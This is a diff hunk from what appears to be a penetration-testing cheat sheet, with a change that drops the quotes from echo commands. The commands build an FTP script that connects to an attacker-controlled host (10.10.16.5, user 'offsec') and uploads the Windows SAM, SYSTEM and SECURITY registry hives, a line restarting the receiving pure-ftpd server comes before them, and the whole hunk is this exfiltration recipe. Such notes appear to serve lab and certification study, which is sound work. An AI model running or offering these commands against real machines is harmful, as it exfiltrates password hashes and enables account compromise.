@@ -122,21 +122,21 @@ https://www.epochconverter.com/ldap # Allows to transform data and to know if th
 
 ``systemctl restart pure-ftpd``
 
-``echo 'open 10.10.16.5 21'> ftp.txt``
+``echo open 10.10.16.5 21> ftp.txt``
 
-``echo 'USER offsec'>> ftp.txt``
+``echo USER offsec>> ftp.txt``
 
-``echo 'lab'>> ftp.txt``
+``echo lab>> ftp.txt``
 
-``echo 'bin'>> ftp.txt``
+``echo bin>> ftp.txt``
 
-``echo 'PUT C:\windows\system32\config\SYSTEM'>> ftp.txt``
+``echo PUT C:\windows\system32\config\SYSTEM>> ftp.txt``
 
-``echo 'PUT C:\windows\system32\config\SAM'>> ftp.txt``
+``echo PUT C:\windows\system32\config\SAM>> ftp.txt``
 
-``echo 'PUT C:\windows\system32\config\SECURITY'>> ftp.txt``
+``echo PUT C:\windows\system32\config\SECURITY>> ftp.txt``
 
-``echo 'bye'>> ftp.txt``
+``echo bye>> ftp.txt``
 
 
 
